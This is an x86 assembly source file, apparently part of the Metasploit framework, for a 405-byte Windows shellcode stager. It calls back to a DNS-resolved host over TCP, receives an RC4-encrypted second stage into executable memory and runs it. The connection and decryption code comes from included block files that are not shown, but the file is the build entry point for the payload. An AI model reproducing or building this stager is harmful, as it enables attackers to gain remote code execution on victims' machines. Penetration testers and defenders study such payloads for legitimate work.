;-----------------------------------------------------------------------------;
; Authors: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
;          Michael Schierl (schierlm[at]gmx[dot]de)        [RC4 support]
;	   Boris Lukashev (rageltman[at]sempervictus)	   [DNS support]
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (31 December 2012)
; Size: 405 bytes
; Build: >build.py stager_reverse_tcp_rc4_dns
;-----------------------------------------------------------------------------;

[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
%include "./src/block/block_api.asm"
start:                   ;
  pop ebp                ; pop off the address of 'api_call' for calling later.
%include "./src/block/block_reverse_tcp_dns.asm"
  ; By here we will have performed the reverse_tcp connection and EDI will be our socket.
%include "./src/block/block_recv_rc4.asm"
  ; By now we will have recieved in the second stage into a RWX buffer and be executing it
